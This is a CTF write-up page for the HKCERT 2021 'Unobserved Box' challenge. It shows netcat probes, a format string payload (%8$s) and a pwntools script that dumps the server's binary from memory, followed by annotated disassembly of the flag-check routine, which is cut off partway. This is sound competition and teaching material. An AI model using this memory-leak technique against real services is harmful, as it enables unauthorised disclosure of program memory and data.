@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en-uk">
+<title>Unobserved Box (250 pts, 6 solves) | Blog by grhkm</title>
+<meta charset="utf-8">
+<meta name="generator" content="Hugo 0.121.2">
+<meta name="description" content="grhkm blog">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://grhkm21.github.io/css/minimal.css">
+
+<style type="text/css"> .notice { --root-color: #444; --root-background: #eff; --title-color: #fff; --title-background: #7bd; --error-title: #c33; --error-content: #fee; --warning-title: #fb7; --warning-content: #fec; --info-title: #6be; --info-content: #e7f2fa; --success-title: #5a5; --success-content: #efe } @media (prefers-color-scheme:dark) {} { .notice { --root-color: #ddd; --root-background: #eff; --title-color: #fff; --title-background: #7bd; --error-title: #800; --error-content: #400; --warning-title: #a50; --warning-content: #420; --info-title: #069; --info-content: #023; --success-title: #363; --success-content: #121 } } body.dark .notice { --root-color: #ddd; --root-background: #eff; --title-color: #fff; --title-background: #7bd; --error-title: #800; --error-content: #400; --warning-title: #a50; --warning-content: #420; --info-title: #069; --info-content: #023; --success-title: #363; --success-content: #121; } .notice { padding: 18px; line-height: 24px; margin-bottom: 24px; border-radius: 4px; color: var(--root-color); background: var(--root-background); align-items: center; } .notice p:last-child { margin-bottom: 0 } .notice-title { margin: -18px -18px 12px; padding: 4px 18px; border-radius: 4px 4px 0 0; font-weight: 700; color: var(--title-color); background: var(--title-background); } .notice.error .notice-title { background: var(--error-title) } .notice.error { background: var(--error-content) } .notice.warning .notice-title { background: var(--warning-title) } .notice.warning { background: var(--warning-content) } .notice.info .notice-title { background: var(--info-title) } .notice.info { background: var(--info-content) } .notice.success .notice-title { background: var(--success-title) } .notice.success { background: var(--success-content) } .icon-notice { margin-right: 8px; margin-top: 2px; } .icon-notice img, .icon-notice svg { height: 1em; width: 1em; fill: currentColor; display: inline-block; position: relative; vertical-align: middle; } </style>
+<div><svg width="0" height="0" display="none" xmlns="http://www.w3.org/2000/svg"><symbol id="success-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628 0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z"/></symbol><symbol id="info-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="error-notice" viewBox="0 0 576 512" preserveAspectRatio="xMidYMid meet"><path d="M569.517 440.013C587.975 472.007 564.806 512 527.94 512H48.054c-36.937 0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154 0l239.94 416.028zM288 354c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="warning-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M256 8C119.043 8 8 119.083 8 256c0 136.997 111.043 248 248 248s248-111.003 248-248C504 119.083 392.957 8 256 8zm0 110c23.196 0 42 18.804 42 42s-18.804 42-42 42-42-18.804-42-42 18.804-42 42-42zm56 254c0 6.627-5.373 12-12 12h-88c-6.627 0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h12v-64h-12c-6.627 0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h64c6.627 0 12 5.373 12 12v100h12c6.627 0 12 5.373 12 12v24z"/></symbol></svg></div>
+
+<link rel="canonical" href="https://grhkm21.github.io/posts/hkcert-unobserved-box/">
+<link rel="alternate" type="application/rss+xml" href="" title="Blog by grhkm">
+<link rel="stylesheet" href="https://grhkm21.github.io/katex/katex.min.css">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body)"></script>
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
+
+
+
+<link rel="stylesheet" href="https://grhkm21.github.io/css/spoiler.css">
+
+
+<link rel="stylesheet" href="https://grhkm21.github.io/scss/main.css">
+
+
+<link rel="stylesheet" href="https://grhkm21.github.io/scss/variables.css">
+
+
+<link rel="stylesheet" href="https://grhkm21.github.io/scss/hint.css">
+
+<script defer src="https://grhkm21.github.io/js/spoiler.js"></script>
+
+<header>
+  
+    <a href="https://grhkm21.github.io/" class="title">Blog by grhkm</a>
+  
+  
+    <nav>
+    
+      <a href="/about-me">About Me</a>
+    
+      <a href="/posts">Posts</a>
+    
+      <a href="/isogenies">Isogenies</a>
+    
+    </nav>
+  
+</header>
+
+<article>
+  <header>
+    <h1>Unobserved Box (250 pts, 6 solves)</h1>
+    <time datetime="2021-11-14T23:24:27Z">November 14, 2021</time>
+  </header>
+  <p>Team Name: O0027 - UND3r 20 D53 H473r5 4ND r374K3r</p>
+<p>Solved by: grhkm and Kaiziron</p>
+<p>Source of the problem: <a href="https://platform.ctf.hkcert.org/challenges/32">HKCERT CTF 2021</a></p>
+<h2 id="problem-statement">Problem Statement</h2>
+<blockquote>
+<p>All codes are uncertain before the measurement, and you will never make it.</p>
+<p>Observe the code to get the flag.</p>
+<p><code>nc chalp.hkcert21.pwnable.hk 28132</code></p>
+</blockquote>
+<h2 id="solution-outline">Solution Outline</h2>
+<p>We dump the binary from 0x400000 to 0x405000 using format string and <code>%8$s</code>, then reverse engineer the <code>check</code> function for the flag.</p>
+<h2 id="initial-discoveries">Initial Discoveries</h2>
+<p>Let&rsquo;s have a look at the server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nc chalp.hkcert21.pwnable.hk <span style="color:#ae81ff">28132</span>
+</span></span><span style="display:flex;"><span>AAAAAAAA
+</span></span><span style="display:flex;"><span>AAAAAAAA is not the correct answer.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ python3 -c <span style="color:#e6db74">&#34;print(&#39;A&#39; \* 200)&#34;</span> | nc chalp.hkcert21.pwnable.hk <span style="color:#ae81ff">28132</span>
+</span></span><span style="display:flex;"><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA is not the correct answer.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ python3 -c <span style="color:#e6db74">&#34;print(&#39;A&#39; \* 2000)&#34;</span> | nc chalp.hkcert21.pwnable.hk <span style="color:#ae81ff">28132</span>
+</span></span><span style="display:flex;"><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA is not the correct answer.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ python3 -c <span style="color:#e6db74">&#34;print(&#39;%p|&#39; * 25)&#34;</span> | nc chalp.hkcert21.pwnable.hk <span style="color:#ae81ff">28132</span>
+</span></span><span style="display:flex;"><span>0x7fffe0708a40|0x7fffe0708a40|<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>|0x7fcf5ced7d80|0x7fcf5ced7d80|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x257c70257c7025|0x401490| is not the correct answer.
+</span></span></code></pre></div><p>Woah, we just found a format string vulnerability!</p>
+<h2 id="dumping-binary">Dumping Binary</h2>
+<p>With the format string vulnerability, let&rsquo;s tweak it to point to our input:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ python3 -c <span style="color:#e6db74">&#34;print(&#39;%p&#39; + &#39;|&#39; + &#39;A&#39; * 20)&#34;</span> | nc chalp.hkcert21.pwnable.hk <span style="color:#ae81ff">28132</span>
+</span></span><span style="display:flex;"><span>0x7ffc5c5ede60|AAAAAAAAAAAAAAAAAAAA is not the correct answer.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ python3 -c <span style="color:#e6db74">&#34;print(&#39;%1\$p&#39; + &#39;|&#39; + &#39;A&#39; * 20)&#34;</span> | nc chalp.hkcert21.pwnable.hk <span style="color:#ae81ff">28132</span>
+</span></span><span style="display:flex;"><span>0x7fffebbd6ef0|AAAAAAAAAAAAAAAAAAAA is not the correct answer.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ python3 -c <span style="color:#e6db74">&#34;print(&#39;%8\$p&#39; + &#39;|&#39; + &#39;A&#39; * 20)&#34;</span> | nc chalp.hkcert21.pwnable.hk <span style="color:#ae81ff">28132</span>
+</span></span><span style="display:flex;"><span>0x4141414141414141|AAAAAAAAAAAAAAAAAAAA is not the correct answer.
+</span></span></code></pre></div><p>So now that our format string <code>%8$p</code> points to the input, how about we write an address to it? More importantly, we know that 64-bit code segments usually start at 0x400000, so we can explore that:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ python3 -c <span style="color:#e6db74">&#34;print(&#39;%8\$p&#39; + &#39;|&#39; + &#39;ABCDEFGHIJKLMNOPQRST&#39;)&#34;</span> | nc chalp.hkcert21.pwnable.hk <span style="color:#ae81ff">28132</span>
+</span></span><span style="display:flex;"><span>0x535251504f4e4d4c|ABCDEFGHIJKLMNOPQRST is not the correct answer.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x53 -&gt; S, 0x4c -&gt; L</span>
+</span></span><span style="display:flex;"><span>❯ python3 -c <span style="color:#e6db74">&#34;print(&#39;%8\$p&#39; + &#39;|&#39; + &#39;ABCDEFGHIJK________&#39;)&#34;</span> | nc chalp.hkcert21.pwnable.hk <span style="color:#ae81ff">28132</span>
+</span></span><span style="display:flex;"><span>0x5f5f5f5f5f5f5f5f|ABCDEFGHIJK________ is not the correct answer.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ python3 -c <span style="color:#e6db74">&#34;print(&#39;%8\$p&#39; + &#39;|&#39; + &#39;ABCDEFGHIJK\x00\x00\x40\x00\x00\x00\x00\x00&#39;)&#34;</span> | nc chalp.hkcert21.pwnable.hk <span style="color:#ae81ff">28132</span>
+</span></span><span style="display:flex;"><span>0x400000|ABCDEFGHIJK is not the correct answer.
+</span></span></code></pre></div><p>Great, now note that the <code>$s</code> format provides functionality to output the string at the location. So for example in the last command above, if we replace <code>%8$p</code> with <code>%8$s</code>, we would get:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># the magic header has appeared</span>
+</span></span><span style="display:flex;"><span>❯ python3 -c <span style="color:#e6db74">&#34;print(&#39;%8\$s&#39; + &#39;|&#39; + &#39;ABCDEFGHIJK\x00\x00\x40\x00\x00\x00\x00\x00&#39;)&#34;</span> | nc chalp.hkcert21.pwnable.hk <span style="color:#ae81ff">28132</span>
+</span></span><span style="display:flex;"><span>ELF|ABCDEFGHIJK is not the correct answer.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ python3 -c <span style="color:#e6db74">&#34;print(&#39;%8\$s&#39; + &#39;|&#39; + &#39;ABCDEFGHIJK\x00\x00\x40\x00\x00\x00\x00\x00&#39;)&#34;</span> | nc chalp.hkcert21.pwnable.hk <span style="color:#ae81ff">28132</span> | hexdump -C
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  7f <span style="color:#ae81ff">45</span> 4c <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">01</span> 7c  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">47</span> <span style="color:#ae81ff">48</span>  |.ELF...|ABCDEFGH|
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000010</span>  <span style="color:#ae81ff">49</span> 4a 4b <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">20</span> 6e  6f <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">63</span>  |IJK is not the c|
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000020</span>  6f <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">61</span>  6e <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">72</span> 2e 0a     |orrect answer..|
+</span></span><span style="display:flex;"><span>0000002f
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># remember - 64-bit systems!</span>
+</span></span><span style="display:flex;"><span>❯ python3 -c <span style="color:#e6db74">&#34;print(&#39;%8\$s&#39; + &#39;|&#39; + &#39;ABCDEFGHIJK\x00\x00\x40\x00\x00\x00\x00\x00&#39;)&#34;</span> | nc chalp.hkcert21.pwnable.hk <span style="color:#ae81ff">28132</span> | python3 -c <span style="color:#e6db74">&#34;print(input().split(&#39;|&#39;)[0], end=&#39;&#39;)&#34;</span> | hexdump -C
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  7f <span style="color:#ae81ff">45</span> 4c <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">01</span>                              |.ELF...|
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000007</span>
+</span></span></code></pre></div><p>Hurray! Since strings are terminated by null-bytes, we also know that the byte after the output is a null byte, and we can continue at that address and repeat.</p>
+<p>(Note: if there is no output, which is the case for address 0x400008)</p>
+<p>There are a few other issues to address. An important one is when the address contains <code>\x0a</code>, more commonly known as <code>\n</code>, the print statement will output a newline and the server skips the part afterwards. I simply skip over them, which shouldn&rsquo;t cause too much of a problem - just a single byte replaced with a null byte.</p>
+<p>Now let&rsquo;s put this all into one python script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;WARNING&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>host, port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chalp.hkcert21.pwnable.hk&#39;</span>, <span style="color:#ae81ff">28132</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">init</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> conn
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> conn <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        conn<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> remote(host, port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump</span>(addr):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Turn 0x400102 into b&#39;\x02\x01\x40\x00\x00\x00\x00\x00&#39;</span>
+</span></span><span style="display:flex;"><span>    bddr <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(hex(addr)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">16</span>))[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Handling special case: &#39;\n&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">in</span> bddr:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Then construct payload: [fs]|[pad][bddr]</span>
+</span></span><span style="display:flex;"><span>    fs <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;%8$s&#39;</span>
+</span></span><span style="display:flex;"><span>    pad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ABCDEFGHIJK&#39;</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> fs <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|&#39;</span> <span style="color:#f92672">+</span> pad <span style="color:#f92672">+</span> bddr
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># send it!</span>
+</span></span><span style="display:flex;"><span>    init()
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[*] </span><span style="color:#e6db74">{</span>hex(addr)<span style="color:#e6db74">}</span><span style="color:#e6db74"> =&gt; </span><span style="color:#e6db74">{</span>response<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400000</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># append, bytes</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;dump&#39;</span>, <span style="color:#e6db74">&#39;ab&#39;</span>) <span style="color:#66d9ef">as</span> fout:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># ends at null byte</span>
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> dump(addr) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>        addr <span style="color:#f92672">+=</span> len(res)
+</span></span><span style="display:flex;"><span>        fout<span style="color:#f92672">.</span>write(res)
+</span></span><span style="display:flex;"><span>        fout<span style="color:#f92672">.</span>flush()
+</span></span></code></pre></div><p>The next step is to let the code run zzz&hellip;</p>
+<p>You can download <a href="/files/dump">the binary</a> I got.</p>
+<h2 id="reverse-engineering">Reverse Engineering</h2>
+<p>Once we have sufficient amount of the binary, we can open it in IDA or other tools. Looking around,
+we find what seems to be the check function:</p>
+<p><img src="/images/unobserved-box-ida.png" alt="Scary for a crypto one-trick!"></p>
+<p>Each block is relatively simple, and we can go through them one by one. Just a trick in general - not everything has to be carefully checked and rigorous. Looking through the code and cracking it took us one minute - guess and hand-waving work is key!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">push</span>    <span style="color:#66d9ef">rbp</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rbp</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub</span>     <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">10</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">var_8</span>], <span style="color:#66d9ef">rdi</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">var_8</span>]    <span style="color:#75715e"># [rdp+var_8] is our input string (s)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">call</span>    <span style="color:#66d9ef">sub_401060</span>          <span style="color:#75715e"># some libc function with a string parameter - len!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">cmp</span>     <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">13</span><span style="color:#66d9ef">h</span>            <span style="color:#75715e"># [1] len(s) == 19 (0x13)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">jz</span>      <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">loc_4011BA</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">var_8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span>     <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">6</span>              <span style="color:#75715e"># s[6]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">movzx</span>   <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rax</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span>     <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">5</span><span style="color:#66d9ef">Fh</span>             <span style="color:#75715e"># [2] s[6] == &#39;_&#39; (0x5f)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">jnz</span>     <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">loc_4011E3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">var_8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span>     <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">9</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">movzx</span>   <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rax</span>] <span style="color:#75715e"># edx = s[9]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">var_8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span>     <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">movzx</span>   <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rax</span>] <span style="color:#75715e"># eax = s[6]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">cmp</span>     <span style="color:#66d9ef">dl</span>, <span style="color:#66d9ef">al</span>              <span style="color:#75715e"># [3] s[6] == s[9]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">jz</span>      <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">loc_4011ED</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">var_8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">edx</span>, <span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lea</span>     <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">aPrintf_0</span>  <span style="color:#75715e">; &#34;printf&#34; # aww IDA is so nice
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">call</span>    <span style="color:#66d9ef">sub_401040</span>          <span style="color:#75715e"># some libc function with two string parameters (one is constant)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">test</span>    <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>            <span style="color:#75715e"># probably strcmp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">jz</span>      <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">loc_401213</span>    <span style="color:#75715e"># [4] s[:6] == &#34;printf&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">var_8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span>     <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">0</span><span style="color:#66d9ef">Ah</span>            <span style="color:#75715e"># start at s[10]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">edx</span>, <span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lea</span>     <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">aDanger</span>    <span style="color:#75715e">; &#34;danger&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">call</span>    <span style="color:#66d9ef">sub_401040</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">test</span>    <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>            <span style="color:#75715e"># [5] s[10:16] == &#34;danger&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">jz</span>      <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">loc_40123D</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">var_8</span>]
